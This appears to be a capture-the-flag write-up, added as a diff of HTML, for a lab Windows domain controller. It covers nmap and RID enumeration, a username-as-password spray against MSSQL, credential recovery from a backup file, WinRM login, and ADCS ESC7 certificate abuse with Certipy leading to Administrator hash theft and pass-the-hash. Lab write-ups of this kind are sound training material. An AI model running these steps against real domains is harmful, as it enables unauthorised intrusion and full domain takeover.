@@ -1,0 +1,53 @@
+<h2>Machine Info</h2>
+<p><strong>OS:</strong> Windows Server 2019 (Domain Controller) &nbsp;|&nbsp; <strong>Difficulty:</strong> Medium &nbsp;|&nbsp; <strong>IP:</strong> 10.10.11.236</p>
+
+<h2>Enumeration</h2>
+<pre>nmap -sC -sV -p- 10.10.11.236
+
+Notable open ports:
+  53   DNS
+  88   Kerberos  ← DC confirmed
+  389  LDAP
+  445  SMB
+  1433 MSSQL
+  5985 WinRM
+  3268 Global Catalog LDAP</pre>
+
+<h2>User Enumeration</h2>
+<p>RID cycling over SMB (null session) to enumerate domain users:</p>
+<pre>crackmapexec smb 10.10.11.236 --rid-brute</pre>
+<p>Test all users against MSSQL with default/weak passwords using a username-as-password spray:</p>
+<pre>crackmapexec mssql 10.10.11.236 -u users.txt -p users.txt --no-bruteforce</pre>
+<p>Hit: <code>operator:operator</code></p>
+
+<h2>MSSQL Filesystem Enumeration</h2>
+<p>Connect and enumerate the web root via <code>xp_dirtree</code>:</p>
+<pre>impacket-mssqlclient 'operator:operator@10.10.11.236'
+SQL> EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1</pre>
+<p>Find <code>.old-conf.zip</code> backup. Download via the HTTP service → contains credentials for user <code>raven</code>.</p>
+
+<h2>WinRM → User</h2>
+<pre>evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'</pre>
+
+<h2>ADCS ESC7 Privilege Escalation</h2>
+<p>Enumerate certificates with Certipy:</p>
+<pre>certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -vulnerable</pre>
+<p><code>raven</code> has <strong>Manage CA</strong> right on the CA — ESC7 condition. Steps:</p>
+<ol>
+  <li>Grant yourself <em>Manage Certificates</em> right</li>
+  <li>Enable the vulnerable <code>SubCA</code> template</li>
+  <li>Request a certificate for <code>Administrator</code> (will fail, but saves the private key)</li>
+  <li>Issue the pending certificate as CA manager</li>
+  <li>Retrieve the issued cert</li>
+  <li>Use <code>certipy auth</code> to get a TGT / NTLM hash for Administrator</li>
+</ol>
+<pre>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236</pre>
+<p>Pass-the-Hash or PTT → root shell.</p>
+
+<h2>Key Takeaways</h2>
+<ul>
+  <li>Username-as-password spray is always worth running against MSSQL</li>
+  <li>xp_dirtree doesn't need sysadmin — it just needs the filesystem ACL</li>
+  <li>ADCS misconfigurations are extremely common in real-world AD environments; run Certipy on every engagement</li>
+  <li>ESC7 requires CA Manager rights — always enumerate CA ACLs, not just template ACLs</li>
+</ul>
